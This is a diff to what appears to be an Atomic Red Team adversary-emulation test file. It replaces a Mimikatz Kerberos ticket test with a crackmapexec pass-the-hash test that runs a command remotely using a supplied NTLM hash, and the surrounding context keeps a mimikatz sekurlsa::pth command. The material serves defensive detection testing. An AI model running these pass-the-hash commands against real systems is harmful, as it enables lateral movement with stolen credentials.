@@ -30,13 +30,13 @@ atomic_tests:
     command: |
       mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
 
-- name: Mimikatz Kerberos Ticket Attack
+- name: crackmapexec Pass the Hash
   description: |
-    Similar to PTH, but attacking Kerberos
+     command execute with crackmapexec
 
   supported_platforms:
     - windows
-
+ 
   input_arguments:
     user_name:
       description: username
@@ -46,8 +46,31 @@ atomic_tests:
       description: domain
       type: string
       default: atomic.local
+    ntlm: 
+      description: command
+      type: string
+      default: cc36cf7a8514893efccd3324464tkg1a
+    command:
+      description: command to execute
+      type: string
+      default: whoami
+    crackmapexec_exe:
+      description: crackmapexec windows executable
+      type: Path
+      default: C:\CrackMapExecWin\crackmapexec.exe
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})
+      prereq_command: |
+        if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }
+      get_prereq_command: |
+        Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}
 
   executor:
     name: command_prompt
+    elevation_required: false
     command: |
-      mimikatz # kerberos::ptt #{user_name}@#{domain}
+      crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} 
+
